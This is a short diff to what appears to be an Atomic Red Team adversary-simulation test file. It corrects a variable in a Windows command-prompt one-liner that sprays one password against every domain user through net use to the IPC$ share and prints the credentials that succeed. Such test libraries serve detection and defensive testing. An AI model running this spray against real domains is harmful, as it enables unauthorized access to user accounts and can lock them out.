@@ -18,7 +18,7 @@ atomic_tests:
       rem Set your password for the spray here
       set password=Spring2020
       rem Execute the password spray, trying the password set above for every user in the domain
-      @FOR /F %n in (%temp%\users.txt) do @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "%password%" 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete %logonserver%\IPC$ > NUL
+      @FOR /F %n in (%temp%\users.txt) do @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "%password%" 1>NUL 2>&1 && @echo [*] %n:%password% && @net use /delete %logonserver%\IPC$ > NUL
     name: command_prompt
   
   
